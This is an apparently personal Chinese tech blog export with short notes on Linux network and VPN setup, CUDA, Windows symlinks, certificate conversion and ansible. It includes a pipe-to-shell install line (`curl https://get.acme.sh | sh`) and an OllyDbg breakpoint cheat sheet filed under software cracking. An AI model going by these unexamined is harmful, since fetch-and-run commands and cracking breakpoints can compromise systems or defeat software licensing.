<p><strong>/etc/sysconfig/network-scripts/ifcfg-INTERFACE_NAME</strong></p>
<h5 id="格式">格式</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEVICE=: 关联的设备名称，要与文件名的后半部“INTERFACE_NAME”保持一致; </span><br><span class="line">BOOTPROTO=&#123;static|none|dhcp|bootp&#125;: 引导协议；要使用静态地址，使用static或none；dhcp表示使用DHCP服务器获取地址；</span><br><span class="line">IPADDR=: IP地址</span><br><span class="line">NETMASK=：子网掩码</span><br><span class="line">GATEWAY=：设定默认网关；</span><br><span class="line">ONBOOT=：开机时是否自动激活此网络接口；</span><br><span class="line">HWADDR=： 硬件地址，要与硬件中的地址保持一致；可省；</span><br><span class="line">USERCTL=&#123;yes|no&#125;: 是否允许普通用户控制此接口；</span><br><span class="line">PEERDNS=&#123;yes|no&#125;: 是否在BOOTPROTO为dhcp时接受由DHCP服务器指定的DNS地址；</span><br></pre></td></tr></table></figure>
<h4 id="路由配置文件">路由配置文件</h4>
<p><strong>/etc/sysconfig/network-scripts/route-INTERFACE_NAME</strong></p>
<h5 id="格式-1">格式</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1</span><br><span class="line">DEST via NEXTHOP</span><br><span class="line">#2</span><br><span class="line">ADDRESS0=ip</span><br><span class="line">NETMASK0=netmask</span><br><span class="line">GATEWAY0=gateway</span><br></pre></td></tr></table></figure>
<h3 id="debian">Debian</h3>
<h4 id="网络配置文件-1">网络配置文件</h4>
<p>网卡的所有配置都在<strong>/etc/network/interfaces</strong></p>
<h4 id="主机名配置-1">主机名配置</h4>
<p><strong>/etc/hostname</strong> <strong>/etc/hosts</strong> ####
路由配置</p>
<h5 id="多网卡静态路由配置">多网卡静态路由配置</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># The primary network interface</span><br><span class="line">auto eth0                                                         #网卡开机启动</span><br><span class="line">iface eth0 inet static                                      #定义为静态 IP</span><br><span class="line">        mtu 1492                                                  #定义 MTU</span><br><span class="line">        address 192.168.100.113                      #定义 IP 地址</span><br><span class="line">        netmask 255.255.255.0                          #定义子网掩码</span><br><span class="line">        dns-nameservers 192.168.100.253      #定义 DNS</span><br><span class="line">        up route add -net 192.168.0.0/16 gateway 192.168.100.1 dev eth0                       #eth0 连接增加静态路由</span><br><span class="line">        down route del -net 192.168.0.0/16 gateway 192.168.100.1 dev eth0                   #eth0 断开删除指定路由</span><br><span class="line"># The second network interface</span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">        mtu 1492</span><br><span class="line">        address x.x.x.x</span><br><span class="line">        netmask y.y.y.y</span><br><span class="line">        gateway z.z.z.z</span><br><span class="line">        dns-nameservers 223.6.6.6</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux技术</category>
      </categories>
  </entry>
  <entry>
    <title>Linux学习-链接汇总</title>
    <url>/Linux%E5%AD%A6%E4%B9%A0-%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h3 id="传送门">传送门</h3>
<p><a
href="http://c.biancheng.net/linux_tutorial/">C语言中文网-Linux</a> <a
href="http://c.biancheng.net/cpp/shell/">C语言中文网-Shell</a> <a
href="https://www.leolan.top/index.php/posts/74.html">当用户模式修改密码</a></p>
]]></content>
      <categories>
        <category>链接</category>
      </categories>
  </entry>
  <entry>
    <title>Ollydbg快速断点</title>
    <url>/Ollydbg%E5%BF%AB%E9%80%9F%E6%96%AD%E7%82%B9/</url>
    <content><![CDATA[<h1 id="介绍">介绍</h1>
<p>快速断点指令速查。</p>
<span id="more"></span>
<h2 id="一.-vc">一. VC</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607122755046.png" /></p>
<h3 id="messagebox">1. MessageBox</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP MessageBoxA</span><br><span class="line">BP SendMessageA</span><br></pre></td></tr></table></figure>
<h3 id="dialogo-box">2. Dialogo Box</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP GetWindowTextA</span><br><span class="line">BP GetDlgItemTextA</span><br></pre></td></tr></table></figure>
<h3 id="windows">3. Windows</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP CreateWindowExA</span><br><span class="line">BP DialogBoxParamA</span><br><span class="line">BP ShowWindow</span><br></pre></td></tr></table></figure>
<h3 id="archives">4. Archives</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP ReadFile</span><br><span class="line">BP WriteFile</span><br><span class="line">BP CreateFileA</span><br></pre></td></tr></table></figure>
<h3 id="archives-ini">5. Archives INI</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP GetPrivateProfileStringA</span><br><span class="line">BP GetPricateProfileIntA</span><br></pre></td></tr></table></figure>
<h3 id="process">6. Process</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP ExitProcess</span><br></pre></td></tr></table></figure>
<h3 id="registry">7. Registry</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP RegCreateKeyA</span><br><span class="line">BP RegQueryValueExA</span><br><span class="line">BP RegOpenKeyA</span><br><span class="line">BP RegClosekey</span><br></pre></td></tr></table></figure>
<h3 id="date-and-hour">8. Date and Hour</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP GetLocalTime</span><br><span class="line">BP GetSystemTime</span><br><span class="line">BP GetFileTime</span><br></pre></td></tr></table></figure>
<h3 id="access-to-units">9. Access to units</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP GetDriveTypeA</span><br></pre></td></tr></table></figure>
<h3 id="string">10. String</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP lstrcatA</span><br><span class="line">BP lstrcmpA</span><br><span class="line">BP lstrcpyA</span><br><span class="line">BP lstrlenA</span><br></pre></td></tr></table></figure>
<h2 id="二.-vb">二. VB</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607123606038.png" /></p>
<h3 id="messages-and-windows">1. Messages and Windows</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP rtcMsgBox</span><br><span class="line">BP __vbaNew2</span><br></pre></td></tr></table></figure>
<h3 id="comparsion">2. Comparsion</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BP __vbaVerCat</span><br><span class="line">BP __vbaVarVmpEq</span><br><span class="line">BP __vbaVarTextCmpEq</span><br><span class="line">BP __vbaVarTextTstEq</span><br><span class="line">BP __vbaVarTstEq</span><br><span class="line">BP __vbaStrCat</span><br><span class="line">BP __vbaStrCmp</span><br><span class="line">BP __vbaStrComp</span><br><span class="line">BP __vbaStrCompVar</span><br><span class="line">BP __vbaStrCopy</span><br><span class="line">BP __vbaStrTextCmp</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crack</category>
      </categories>
  </entry>
  <entry>
    <title>SoftetherVPN搭建虚拟局域网</title>
    <url>/SoftetherVPN%E6%90%AD%E5%BB%BA%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/</url>
    <content><![CDATA[<h1 id="softether使用">Softether使用</h1>
<h2 id="服务器端">服务器端</h2>
<h3 id="安装软件">安装软件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install gcc make gcc-multilib -y </span><br></pre></td></tr></table></figure>
<h3 id="下载好源码">下载好源码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf softether-vpnserver-v4.34-9745-rtm-2020.04.05-linux-x64-64bit.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="编译">编译</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<h3 id="启用服务">启用服务</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vpnserver start</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="配置服务">配置服务</h3>
<p>我这里使用了windows端下的配置工具</p>
<h4 id="管理本地网桥">管理本地网桥</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404143058855.png" /></p>
<h4 id="创建本地网桥">创建本地网桥</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142204270.png" /></p>
<h4 id="网桥附加ip地址">网桥附加ip地址</h4>
<p>我选择了30网段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr <span class="built_in">set</span> 192.168.30.1/24 dev tap_vpn</span><br></pre></td></tr></table></figure>
<h4 id="创建dhcp服务">创建dhcp服务</h4>
<p>依据上面的网段编写配置文件</p>
<p><code>vim /etc/dnsmasq.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface=tap_vpn</span><br><span class="line">dhcp-range=tap_vpn,192.168.30.100,192.168.30.200,12h</span><br><span class="line">dhcp-option=tap_vpn,3,192.168.30.1</span><br></pre></td></tr></table></figure>
<h4 id="启用服务-1">启用服务</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable dnsmasq</span><br><span class="line">systemctl start dnsmasq</span><br></pre></td></tr></table></figure>
<h4 id="编写启动脚本-sysv">编写启动脚本-sysV</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/init.d/vpnserver </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:          vpnserver</span></span><br><span class="line"><span class="comment"># Required-Start:    $remote_fs $syslog</span></span><br><span class="line"><span class="comment"># Required-Stop:     $remote_fs $syslog</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:      0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Start daemon at boot time</span></span><br><span class="line"><span class="comment"># Description:       Enable Softether by daemon.</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">DAEMON=/root/vpnserver/vpnserver</span><br><span class="line">LOCK=/var/lock/subsys/vpnserver</span><br><span class="line">TAP_ADDR=192.168.30.1</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> -x <span class="variable">$DAEMON</span> || <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">	start)</span><br><span class="line">		<span class="variable">$DAEMON</span> start</span><br><span class="line">		<span class="built_in">touch</span> <span class="variable">$LOCK</span></span><br><span class="line">		<span class="built_in">sleep</span> 1</span><br><span class="line">		/sbin/ip addr add <span class="variable">$TAP_ADDR</span>/24 dev tap_vpn</span><br><span class="line">	;;</span><br><span class="line">	stop)</span><br><span class="line">		<span class="variable">$DAEMON</span> stop</span><br><span class="line">		<span class="built_in">rm</span> <span class="variable">$LOCK</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	restart)</span><br><span class="line">		<span class="variable">$DAEMON</span> stop</span><br><span class="line">		/sbin/ip addr del <span class="variable">$TAP_ADDR</span>/24 dev tap_vpn</span><br><span class="line">		<span class="built_in">sleep</span> 3</span><br><span class="line">		<span class="variable">$DAEMON</span> start</span><br><span class="line">		<span class="built_in">sleep</span> 1</span><br><span class="line">		/sbin/ip addr add <span class="variable">$TAP_ADDR</span>/24 dev tap_vpn</span><br><span class="line">	;;</span><br><span class="line">	*)</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &#123;start|stop|restart&#125;&quot;</span></span><br><span class="line">		<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
<h4 id="创建虚拟hub">创建虚拟hub</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142817328.png" /></p>
<h4 id="配置虚拟hub">配置虚拟hub</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142824400.png" /></p>
<h4 id="管理虚拟hub">管理虚拟hub</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142902815.png" /></p>
<h4 id="管理组">管理组</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142652660.png" /></p>
<h4 id="管理用户">管理用户</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404142931807.png" /></p>
<h4 id="配置手机登陆">配置手机登陆</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404143134120.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404143154089.png" /></p>
<h4 id="手机设置">手机设置</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404144345811.png" /></p>
<h2 id="客户端">客户端</h2>
<h3 id="安装软件-1">安装软件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install gcc make gcc-multilib -y </span><br></pre></td></tr></table></figure>
<h3 id="下载好源码-1">下载好源码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf softether-vpnclient-v4.34-9745-rtm-2020.04.05-linux-x64-64bit.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="编译-1">编译</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<h3 id="启用服务-2">启用服务</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vpnclient start</span><br></pre></td></tr></table></figure>
<h3 id="配置服务-1">配置服务</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vpncmd </span><br><span class="line">2</span><br><span class="line">AccountCreate //创建连接，需要输入连接名，ip地址，端口号，hub名，用户名，虚拟网卡名</span><br><span class="line">AccountPasswordSet 连接名 //配置用户</span><br><span class="line">AccountStartupSet 连接名 //服务启动自动连接</span><br><span class="line">AccountConnect 连接名</span><br><span class="line">AccountList //用于查看连接状态</span><br></pre></td></tr></table></figure>
<p>如果客户端在局域网可以使用windows的配置工具，需要使用vpncmd开启功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoteEnable</span><br></pre></td></tr></table></figure>
<h4 id="添加新的vpn连接">添加新的vpn连接</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210404144647977.png" /></p>
<h2 id="大功告成">大功告成</h2>
<h3 id="引用">引用：</h3>
<p><a
href="https://ffis.me/archives/1815.html?page=2">搭建softEther，组建虚拟局域网，和基友畅玩经典单机~
- 饭饭's Blog (ffis.me)</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Spring 内置工具类</title>
    <url>/Spring-%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
    <content><![CDATA[<h2 id="参考资料">参考资料</h2>
<p><a href="https://juejin.cn/post/7043403364020781064">资料</a></p>
]]></content>
      <categories>
        <category>Spring</category>
      </categories>
  </entry>
  <entry>
    <title>Visual Stdio 2022 调用CUDA11.6</title>
    <url>/Visual-Stdio-2022-%E8%B0%83%E7%94%A8CUDA11-6/</url>
    <content><![CDATA[<h2 id="步骤">步骤</h2>
<ol type="1">
<li>安装N卡驱动,使用任何一个驱动管理程序即可。</li>
<li>使用<code>nvidia-smi</code>查看适配的<code>CUDA</code>版本，这里适配的是11.6版本。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sat Jul  2 19:32:36 2022</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 512.15       Driver Version: 512.15       CUDA Version: 11.6     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name            TCC/WDDM | Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  NVIDIA GeForce ... WDDM  | 00000000:01:00.0 Off |                  N/A |</span><br><span class="line">| N/A   42C    P0    N/A /  N/A |    123MiB /  4096MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>前往官网进行往期<code>CUDA</code>版本下载 <a
href="https://developer.nvidia.com/cuda-toolkit">cuda-toolkit下载地址</a>，点击<code>DownloadNow</code>，发现目前的版本为<code>11.7</code>，和我们需要的不适配，向下翻找，找到<a
href="https://developer.nvidia.com/cuda-toolkit-archive">Archive of
Previous CUDA Releases</a>，下载我们需要的<code>11.6</code>版本。</li>
<li>下载对应系统的可执行文件执行，然后运行安装，选择最小化安装即可。该安装程序会自动配置环境变量及识别已经安装的<code>Visual Stdio</code>环境。</li>
<li>打开<code>Visual Stdio</code>进行开发，创建新项目，搜索模板<code>CUDA</code>发现出现了新的项目模板。使用该项目模板。
<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220702201409721.png" /></li>
<li>打开示例程序，发现运行不起来。我琢磨了好久，查了好多资料没有找到解决方案，始终无法编译出obj文件，最后只好设置<code>ld.exe</code>的位置到<code>PATH</code>全局变量，使用<code>nvcc</code>手动编译。</li>
<li>使用命令<code>nvcc.exe -c .\kernel.cu -o .\x64\Debug\kernel.cu.obj</code>进行编译，需要注意的是，此时编译出来的obj文件无法进行调试，需要加上参数<code>-g</code>
方能进行调试。</li>
<li>再使用调试器即可正常看到运行结果 <img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220702202133241.png" /></li>
<li>使用<code>nvidia-smi</code>查看程序是否运行在显卡上，结果如下，该程序运行于显卡之上且可调试。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">|    0   N/A  N/A     19968    C+G   ...ge\Application\msedge.exe    N/A      |</span><br><span class="line">|    0   N/A  N/A     21008      C   ...64\Debug\CudaRuntime1.exe    N/A      |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></li>
<li>但是根据资料查到，原生调试时程序并不会运行于GPU而是CPU之上，需要借助插件才能实现GPU运行，但是我这里不需要使用插件即可运行于GPU之上，但是为了严谨，这里贴出插件的位置。位于<code>工具栏-&gt;扩展-&gt;Nsight</code>,需要打开<code>Break On Launch</code>才能进行调试。
<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220702202655003.png" /></li>
</ol>
<h2 id="参考资料">参考资料</h2>
<p><a
href="https://www.bilibili.com/read/cv16061498/">CUDA及cuDNN安装指南</a></p>
<p><a
href="https://tensorflow.google.cn/install/source_windows">CUDA和cuDNN对应版本</a></p>
<p><a
href="https://developer.nvidia.com/cuda-toolkit-archive">CUDA历史版本下载链接</a></p>
<p><a
href="https://developer.nvidia.com/rdp/cudnn-archive">cuDNN历史版本下载链接</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/488518526">CUDA开发环境搭建 -
知乎 (zhihu.com)</a></p>
<p><a
href="https://zhuanlan.zhihu.com/p/484016885">CUDA入门示例1：两个整型数组相加
- 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>Windows-恢复TrustedInstaller权限</title>
    <url>/Windows-%E6%81%A2%E5%A4%8DTrustedInstaller%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h1 id="修改属主输入用户名称">修改属主，输入用户名称</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT Service\TrustedInstaller</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Thunderbird配置自动代理PAC</title>
    <url>/Thunderbird%E9%85%8D%E7%BD%AE%E8%87%AA%E5%8A%A8%E4%BB%A3%E7%90%86PAC/</url>
    <content><![CDATA[<h3 id="自动配置代理链接">自动配置代理链接</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://prudent-travels.000webhostapp.com/pac.php?a=SOCKS5&amp;b=127.0.0.1:10808</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>链接</category>
      </categories>
  </entry>
  <entry>
    <title>Windows节省C盘空间的常用软链接</title>
    <url>/Windows%E8%8A%82%E7%9C%81C%E7%9B%98%E7%A9%BA%E9%97%B4%E7%9A%84%E5%B8%B8%E7%94%A8%E8%BD%AF%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<ol type="1">
<li>创建目录</li>
<li>链接目录</li>
<li>安装scoop</li>
<li>安装maven</li>
<li>安装nodejs14</li>
<li>安装vscode</li>
<li></li>
</ol>
<h2 id="软链接设置">软链接设置</h2>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># scoop 软链接</span><br><span class="line">mklink /d <span class="variable">%USERPROFILE%</span>\scoop               E:\Programs\scoop</span><br><span class="line"># yarn 软链接</span><br><span class="line">mklink /d <span class="variable">%USERPROFILE%</span>\AppData\Local\yarn  E:\ENV\yarn</span><br><span class="line"># maven 软链接</span><br><span class="line">mklink /d <span class="variable">%USERPROFILE%</span>\.m2                 E:\ENV\.m2</span><br><span class="line"># vscode 软链接</span><br><span class="line">mklink /d <span class="variable">%USERPROFILE%</span>\.vscode             E:\Plugin\.vscode</span><br><span class="line"># source 软链接(Visual Studio项目默认存储地址,由于C#项目会下载依赖项目,所以也进行软链接设置)</span><br><span class="line">mklink /d <span class="variable">%USERPROFILE%</span>\source              E:\WorkSpace\source</span><br></pre></td></tr></table></figure>
<h2 id="目录设置">目录设置</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WorkSpace</span><br><span class="line">├── Code</span><br><span class="line">│   ├── eclipse</span><br><span class="line">│   ├── idea</span><br><span class="line">│   ├── keil</span><br><span class="line">│   ├── pycharm</span><br><span class="line">│   ├── test</span><br><span class="line">│   └── visual_studio</span><br><span class="line">└── Design</span><br><span class="line">    ├── model</span><br><span class="line">    │   ├── blender</span><br><span class="line">    │   └── solidworks</span><br><span class="line">    └── pcb</span><br><span class="line">        ├── altium_designer</span><br><span class="line">        └── kicad</span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>acme.sh证书转换为p12</title>
    <url>/acme-sh%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2%E4%B8%BAp12/</url>
    <content><![CDATA[<h3
id="注册域名例如freenom以及找到dns服务商例如dnspod-免费智能dns解析服务商-电信_网通_教育网智能dns">注册域名（例如<a
href="https://www.freenom.com/zh/index.html?lang=zh">Freenom</a>）以及找到DNS服务商（例如：<a
href="https://www.dnspod.cn/">DNSPod-免费智能DNS解析服务商-电信_网通_教育网,智能DNS</a>）</h3>
<ol type="1">
<li><p>注册域名<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626220554566.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626220928806.png" /></p>
<p><strong>这里是因为国内的ip不能注册免费域名，如何可以，请使用科学上网</strong></p>
<p>修改到<em>DNSPod</em>域名服务器<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221213502.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221303108.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221335309.png" /></p>
<p>获得密钥</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221420066.png" /></p>
<p>保存ID和Token</p></li>
<li><p>在<em>.bash_rc</em>中注册全局变量</p></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> DP_Id=<span class="string">&quot;123&quot;</span> <span class="comment">#DNSPod密钥ID</span></span><br><span class="line"><span class="built_in">export</span> DP_Key=<span class="string">&quot;abc&quot;</span> <span class="comment">#DNSPod密钥Token</span></span><br></pre></td></tr></table></figure>
<h3
id="先注册再生成证书使用dns方式">先注册，再生成证书，使用DNS方式</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">curl https://get.acme.sh | sh</span><br><span class="line">//注册账户</span><br><span class="line">acme.sh --register-account -m divint3@gmail.com </span><br><span class="line"><span class="comment"># 以DNS方式注册证书</span></span><br><span class="line">acme.sh --issue --dns dns_dp -d <span class="string">&quot;divint3.cf&quot;</span> -d <span class="string">&quot;*.divint3.cf&quot;</span></span><br></pre></td></tr></table></figure>
<p>我们可以在这里</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221747950.png" /></p>
<p>可以找到证书</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221811931.png" /></p>
<p>在这里</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20210626221829320.png" /></p>
<h3 id="转换指令转换为pkcs12证书">转换指令（转换为pkcs12证书）</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> \</span><br><span class="line">-<span class="keyword">in</span> fullchain.cer \</span><br><span class="line">-inkey divint3.cf.key \</span><br><span class="line">-out keystore.p12 \</span><br><span class="line">-name tomcat \</span><br><span class="line">-CAfile ca.cer \</span><br><span class="line">-caname root</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> \</span><br><span class="line">-<span class="keyword">in</span> fullchain.cer \</span><br><span class="line">-inkey divint3.cf.key \</span><br><span class="line">-out keystore.p12 \</span><br><span class="line">-name tomcat </span><br><span class="line"></span><br><span class="line"><span class="comment"># 会要求你输入密码，后面会用到</span></span><br></pre></td></tr></table></figure>
<h3 id="application.yaml配置ssl访问">application.yaml配置ssl访问</h3>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line">  <span class="attr">ssl:</span></span><br><span class="line">    <span class="attr">key-store:</span> <span class="string">classpath:keystore.p12</span> <span class="comment"># 放在和application.yaml同级目录</span></span><br><span class="line">    <span class="attr">key-store-type:</span> <span class="string">PKCS12</span></span><br><span class="line">    <span class="attr">key-store-password:</span> <span class="number">200214</span> <span class="comment"># 前面输入的密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">security:</span></span><br><span class="line">  <span class="string">require-ssl=true:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="参考">参考</h3>
<p><a href="https://www.jianshu.com/p/1a792f87b6fe">Let's Encrypt
证书申请及配置 - 简书 (jianshu.com)</a></p>
<p><a
href="https://blog.csdn.net/phris/article/details/106152081">HTTPS证书文件格式转换_phris的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/eb52e0f5ee85">在Spring
Boot中配置ssl证书实现https - 简书 (jianshu.com)</a></p>
<p><a
href="https://www.codenong.com/d-spring-boot-secured-by-lets-encrypt/">让我们加密保护的Spring
Boot | 码农家园 (codenong.com)</a></p>
<p><a href="https://console.dnspod.cn/account/token/token">API 密钥 -
DNSPod-免费智能DNS解析服务商-电信_网通_教育网,智能DNS</a></p>
<p><a href="https://www.jianshu.com/p/4fcc5001f03f">Linux
下使用acme.sh生成Let's Encrypt泛域名免费证书 - 简书
(jianshu.com)</a></p>
]]></content>
      <categories>
        <category>证书</category>
      </categories>
  </entry>
  <entry>
    <title>ansible-笔记</title>
    <url>/ansible-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ansible">ansible</h2>
<h3 id="概念">概念</h3>
<ol type="1">
<li>自动化运维服务端</li>
<li>不需要安装客户端</li>
<li><img src="/images/loading.gif" data-original="/uploads/ansible流程.jpeg" /></li>
<li>yum install epel-relese -y</li>
<li>yum install ansible -y</li>
<li>首先,要先配置ssh免密登录</li>
<li>ssh-keygen</li>
<li>一路回车</li>
<li><code>ssh-copy-id [-i [identity_file]] [user@]machine</code>
<span id="more"></span> ### epel 源 扩展源 基本源 在/mnt下</li>
</ol>
<p>先配置免密登录</p>
<ol type="1">
<li>定义主机清单</li>
<li><code>ansible -i 配置文件 组名 -m 模块名</code></li>
<li><code>ansible -i 配置文件 组名 -m 模块名  -a "name=httpd state=latest"</code></li>
</ol>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>akonadi-提示无法连接数据库</title>
    <url>/akonadi-%E6%8F%90%E7%A4%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
